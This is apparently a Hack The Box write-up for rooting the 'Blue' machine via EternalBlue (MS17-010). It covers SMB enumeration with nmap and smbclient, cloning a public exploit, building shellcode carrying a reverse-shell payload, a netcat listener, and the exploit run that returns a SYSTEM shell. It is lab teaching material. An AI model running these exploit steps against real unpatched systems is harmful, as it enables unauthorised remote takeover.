## Introduction
This article, is aimed at rooting the machine “Blue”, on the online hacking platform — Hack the box.

As always —

> Disclaimer
> As with all things related to ethical hacking, this machine is an intentionally vulnerable machine, whose purpose is to learn ethical hacking techniques. The techniques mentioned should NOT be used for illegal purposes, and should NOT be used on machines without prior authorization from the machine owner.

This was one of my first machines on the platform, and one of the most fun ones. The machine focuses on the “Eternal Blue” exploit that wreaked havoc during the year 2017 across the globe, due to a vulnerable SMB port. This vulnerability was discovered by the NSA at first, and they had developed an exploit for it. However, this exploit was leaked by a group known as the “Shadow Brokers”, and hackers from around the globe started utilizing this to their own advantage. A patch labeled MS17–010 was released by Microsoft soon after, but the damage was already done.

This vulnerability is still seen today, in some older unpatched systems, so better keep an eye out for this one!

## Methodology

### Scanning and enumeration

Let’s start by doing a bit of scanning to check for open ports on the target machine.

_My attacker machine resides at 10.10.14.6 and the victim resides at 10.10.10.40._

```
 sudo nmap -sS -T4 -p- -A 10.10.10.40 -oA blueTcpAll
 Nmap scan report for 10.10.10.40
 Host is up (0.26s latency).
 Not shown: 65519 closed ports
 PORT STATE SERVICE VERSION
 135/tcp open msrpc Microsoft Windows RPC
 139/tcp open netbios-ssn Microsoft Windows netbios-ssn
 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

```

We see a lot of information here. For starters, SMB is port is open, and we see that the machine is running Windows 7 OS. We could check if anonymous access is allowed, and what files are available on the victim machine. Let’s do that!

```
 smbclient -L \\\\\\\\10.10.10.40\\\\
  Enter WORKGROUP\\kali’s password: 
  
  Sharename Type Comment
  — — — — — — — — — — -
  ADMIN$ Disk Remote Admin
  C$ Disk Default share
  IPC$ IPC Remote IPC
  Share Disk 
  Users Disk 
  Reconnecting with SMB1 for workgroup listing.
  do\_connect: Connection to 10.10.10.40 failed (Error NT\_STATUS\_RESOURCE\_NAME\_NOT\_FOUND)
  Unable to connect with SMB1 — no workgroup available
```

There is a non-default share labelled “_Share_” on the victim machine. We could check to see what is inside that share.

```
 smbclient \\\\\\\\10.10.10.40\\\\SHARE
 Enter WORKGROUP\\kali’s password: 

 Try “help” to get a list of possible commands.
 smb: \\ ls
 . D 0 Fri Jul 14 09:48:44 2017
 .. D 0 Fri Jul 14 09:48:44 2017
 
 8362495 blocks of size 4096. 3775880 blocks available
```

Nothing interesting here. I wanted to check if there were any interesting files, such as software configuration files. We could enumerate the other shared folders as well, but there wasn’t anything interesting that would help us at this point. On an actual penetration test, the more you enumerate, the better!

As we saw that SMB is running, we can run an nmap script that checks for all known SMB vulnerabilities. Run the below command:

```
 sudo nmap — script=smb-vuln\* 10.10.10.40 -oA nmapSMBVulnScriptOutput

From the output above, nmap tells us that the machine is vulnerable to CVE-2017–0143 a.k.a Eternal Blue. This is a gold mine for attackers, as it is extremely easy to take advantage of this vulnerability, using tools such as Metasploit. I would be running an exploit manually here, but this can be done via Metasploit as well.

A bit(lot) of googling led me to:
[https://root4loot.com/post/eternalblue\_manual\_exploit/](https://root4loot.com/post/eternalblue_manual_exploit/)
Full credit goes to the author of this amazing exploit!

Do a git clone of the repo

`> git clone [https://github.com/worawit/MS17-010.git](https://github.com/worawit/MS17-010.git)`

This generates a folder, that contains 2 kernel shellcode files, and the main exploit(written in python).

Follow the instructions from the above mentioned website, for assembling the shellcode into binaries, to include in our exploit. These binaries consist of the shellcode, as well as the payload (our reverse shell), that would trigger the exploit, and send us a reverse shell.
Nasm is the assembler that’s used here. We are creating 32-bit and 64-bit binaries and merging the two, into a single binary. This is useful, if the exploit is triggered against a machine with an unknown architecture (32-bit or 64-bit).

Before running the exploit, let’s set up a listener in a new terminal using netcat.
```
> sudo nc -nvlp 443
\[sudo\] password for kali:
listening on \[any\] 443 ..
```
### Exploitation

Now, let’s run our exploit and get a shell! Make sure to include the IP address of the victim machine, and the generated binary, as the arguments to be used.

```
 > python eternalblue\_exploit7.py 10.10.10.40 sc\_all.bin
  shellcode size: 2203
  numGroomConn: 13
  Target OS: Windows 7 Professional 7601 Service Pack 1
  SMB1 session setup allocate nonpaged pool success
  SMB1 session setup allocate nonpaged pool success
  good response status: INVALID\_PARAMETER
 done
```

Ignore the INVALID\_PARAMETER error, as this doesn’t affect the success of the exploit.

Let’s go back to our terminal that’s running netcat, and we should have received a shell (Awesome!)
```
> sudo nc -nvlp 443
  \[sudo\] password for kali: 
  listening on \[any\] 443 …
  connect to \[10.10.14.6\] from (UNKNOWN) \[10.10.10.40\] 49158
  Microsoft Windows \[Version 6.1.7601\]
  Copyright © 2009 Microsoft Corporation. All rights reserved.
  
 C:\\Windows\\system32>
```
If this hasn’t worked for you, run the exploit again (make sure, to revert the machine on HackTheBox to it’s original state).

Let’s double check the IP address and hostname of the victim machine. Also, as you can see, we are running with full SYSTEM privileges on the target machine.

```

That’s it! Now go grab those flags and submit them to hackthebox. Hope this article was helpful!
